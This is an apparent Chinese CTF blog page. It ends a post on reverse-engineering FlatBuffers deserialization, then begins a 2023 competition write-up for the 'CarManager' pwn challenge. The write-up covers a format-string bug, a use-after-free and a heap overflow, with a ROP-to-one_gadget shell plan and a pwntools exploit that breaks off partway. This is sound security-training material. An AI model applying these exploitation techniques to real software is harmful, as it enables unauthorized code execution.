value2_bk = Test::Sample::Weapon::<span class="built_in">value</span>(v14);</span><br><span class="line">  v15 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">2u</span>);</span><br><span class="line">  value3_bk = Test::Sample::Weapon::<span class="built_in">value</span>(v15);</span><br><span class="line">  v16 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">3u</span>);</span><br><span class="line">  value4_bk = Test::Sample::Weapon::<span class="built_in">value</span>(v16);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(&amp;key4_bk);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(&amp;key3_bk);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(&amp;key2_bk);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(&amp;key1_bk);</span><br><span class="line">&#125;</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::~<span class="built_in">vector</span>(&amp;weapons_vector);</span><br><span class="line">flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::~<span class="built_in">FlatBufferBuilderImpl</span>(&amp;builder);</span><br></pre></td></tr></table></figure>
<p>这里我们重点分析反序列化的部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flatbuffers::String *__cdecl Test::Sample::Monster::name(<span class="keyword">const</span> Test::Sample::Monster *<span class="keyword">const</span> <span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> flatbuffers::Table::GetPointer&lt;flatbuffers::String <span class="keyword">const</span>*,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的反序列化会大量使用 <code>flatbuffers::Table::GetXXXX</code> 的函数模板，从这些函数中可以看出一些 Scheme 文件的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flatbuffers::String *__cdecl Test::Sample::Monster::name(<span class="keyword">const</span> Test::Sample::Monster *<span class="keyword">const</span> <span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> flatbuffers::Table::GetPointer&lt;flatbuffers::String <span class="keyword">const</span>*,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>第二个参数的数字可以体现该条目在 Scheme 文件中的位置</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int32_t</span> __cdecl Test::Sample::Weapon::value(<span class="keyword">const</span> Test::Sample::Weapon *<span class="keyword">const</span> <span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> flatbuffers::Table::GetField&lt;<span class="keyword">int</span>&gt;(<span class="keyword">this</span>, <span class="number">6u</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>从传参个数可以判断该条目是否为标量类型（有3个参数即是标量类型，第3个参数为其默认值）</li>
</ul>
<p>在逆向分析 flatbuffers 的过程中，Verifier 可以暴露大量信息（Verifier 是 flatbuffers 的检查器），它的内部结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !flatbuffers::Verifier::<span class="built_in">Check</span>(<span class="keyword">this</span>, <span class="keyword">this</span>-&gt;size_ &gt; <span class="number">0xB</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( identifier )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = <span class="keyword">this</span>-&gt;size_ &gt; <span class="number">7</span> &amp;&amp; flatbuffers::<span class="built_in">BufferHasIdentifier</span>(&amp;<span class="keyword">this</span>-&gt;buf_[start], identifier, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !flatbuffers::Verifier::<span class="built_in">Check</span>(<span class="keyword">this</span>, v4) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">o = flatbuffers::Verifier::VerifyOffset&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="keyword">int</span>&gt;(<span class="keyword">this</span>, start);</span><br><span class="line"><span class="keyword">return</span> flatbuffers::Verifier::<span class="built_in">Check</span>(<span class="keyword">this</span>, o != <span class="number">0</span>)</span><br><span class="line">    &amp;&amp; Test::Sample::Monster::<span class="built_in">Verify</span>((<span class="keyword">const</span> Test::Sample::Monster *<span class="keyword">const</span>)&amp;<span class="keyword">this</span>-&gt;buf_[start + o], <span class="keyword">this</span>);</span><br></pre></td></tr></table></figure>
<p>最后一个函数 Verify 可以泄露有关 Scheme 的信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flatbuffers::Table::<span class="built_in">VerifyTableStart</span>(<span class="keyword">this</span>, verifier)</span><br><span class="line">  &amp;&amp; flatbuffers::Table::VerifyOffset&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, verifier, <span class="number">4u</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v2 = Test::Sample::Monster::<span class="built_in">name</span>(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">if</span> ( flatbuffers::Verifier::<span class="built_in">VerifyString</span>(verifier, v2)</span><br><span class="line">    &amp;&amp; flatbuffers::Table::VerifyOffset&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, verifier, <span class="number">6u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = Test::Sample::Monster::<span class="built_in">weapon</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">ZNK11flatbuffers8Verifier12VerifyVectorIJENS_6OffsetIN4Test6Sample6WeaponEEEjEEbPKNS_6VectorIT0_T1_EE</span>(</span><br><span class="line">           verifier,</span><br><span class="line">           v3) )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = Test::Sample::Monster::<span class="built_in">weapon</span>(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">if</span> ( flatbuffers::Verifier::VerifyVectorOfTables&lt;Test::Sample::Weapon&gt;(verifier, v4)</span><br><span class="line">        &amp;&amp; flatbuffers::Verifier::<span class="built_in">EndTable</span>(verifier) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>VerifyString 用于分析 string 类型</li>
<li>VectorVerifyVectorOfTables 用于分析 Vector 类型</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __cdecl Test::Sample::Weapon::<span class="built_in">Verify</span>(<span class="keyword">const</span> Test::Sample::Weapon *<span class="keyword">const</span> <span class="keyword">this</span>, flatbuffers::Verifier *verifier)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> flatbuffers::String *v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flatbuffers::Table::<span class="built_in">VerifyTableStart</span>(<span class="keyword">this</span>, verifier)</span><br><span class="line">    &amp;&amp; flatbuffers::Table::VerifyOffset&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, verifier, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = Test::Sample::Weapon::<span class="built_in">key</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">if</span> ( flatbuffers::Verifier::<span class="built_in">VerifyString</span>(verifier, v2)</span><br><span class="line">      &amp;&amp; flatbuffers::Table::VerifyField&lt;<span class="keyword">int</span>&gt;(<span class="keyword">this</span>, verifier, <span class="number">6u</span>, <span class="number">4uLL</span>)</span><br><span class="line">      &amp;&amp; flatbuffers::Verifier::<span class="built_in">EndTable</span>(verifier) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>VerifyField 的第4个参数表示该标量类型条目的大小</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/08/%E5%9B%BD%E8%B5%9B-%E5%86%B3%E8%B5%9B2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/08/%E5%9B%BD%E8%B5%9B-%E5%86%B3%E8%B5%9B2023/" class="post-title-link" itemprop="url">国赛-决赛2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-08-08 10:38:09 / Modified: 10:39:58" itemprop="dateCreated datePublished" datetime="2023-08-08T10:38:09+08:00">2023-08-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>30k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>27 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="CarManager"><a href="#CarManager" class="headerlink" title="CarManager"></a>CarManager</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CarManager: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">5e78</span>faed20a68cb3ad600697b0d036baefa646e8, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">write_s</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *introduction_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( introduction_data )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Car Intro: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(introduction_data) &lt;= <span class="number">0x3F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(introduction_data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, introduction_data, <span class="number">0x3D</span>uLL);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_419A);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>UAF 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( check() )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)nameg-&gt;car_name-&gt;descript_data);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)nameg-&gt;car_name-&gt;introduction_data);</span><br><span class="line">  <span class="built_in">free</span>(nameg-&gt;car_name);</span><br><span class="line">  nameg-&gt;car_name = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( nameg-&gt;descript )</span><br><span class="line">&#123;</span><br><span class="line">  size1 = size;</span><br><span class="line">  <span class="keyword">if</span> ( size1 &gt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)nameg-&gt;descript) + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)nameg-&gt;descript);</span><br><span class="line">    user = nameg;</span><br><span class="line">    user-&gt;descript = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里使用 <code>strlen</code> 获取当前 chunk 的 size，在写满的情况下可能会将 next chunk-&gt;size 也计算在内，导致几字节的堆溢出</li>
<li>PS：遇到这种不记录 size 而是使用 <code>strlen</code> 计算 size 的题目，一定要检查有没有堆溢出</li>
</ul>
<p><strong>入侵思路 - 格式化字符串</strong></p>
<p>使用格式化字符串可以泄露 stack_addr 和 libc_base：</p>
<p>接下来就是通过覆盖返回地址打 one_gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>libc-2.31 的 one_gadget 条件比较高，断点到 ret 并查看此时的寄存器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*RDX  <span class="number">0xffffffffffffff9c</span></span><br><span class="line"> R12  <span class="number">0x555555555280</span> ◂— endbr64 </span><br><span class="line"> R15  <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用一个 <code>pop_rdx_ret</code> 就可以将 RDX 置空，在栈上有预留的 “0”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffdc08</span> —▸ <span class="number">0x55555555551a</span> ◂— jmp    <span class="number">0x55555555553f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdc10</span> ◂— <span class="number">0x82d6d98e46a4e59b</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffdc18</span> ◂— <span class="number">0x100000008</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fffffffdc20</span> —▸ <span class="number">0x7fffffffdc30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fffffffdc28</span> —▸ <span class="number">0x55555555555d</span> ◂— mov    eax, <span class="number">0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffdc30</span> ◂— <span class="number">0x0</span> <span class="comment">/* target */</span></span><br></pre></td></tr></table></figure>
<p>搭建 ROP，利用预留的 “0” 置空 RDX，最后写上 one_gadget 就可以了</p>
<p>非完整 exp 如下：（没有写有关逆向的部分）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./CarManager_bug1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;175.22.1.46&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x191F)\nb *$rebase(0x1E3E)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">control</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_user</span>(<span class="params">name,password,phone,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&quot;username: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password: &quot;</span>,password)</span><br><span class="line">    sla(<span class="string">&quot;phoneNum:&quot;</span>,phone)</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    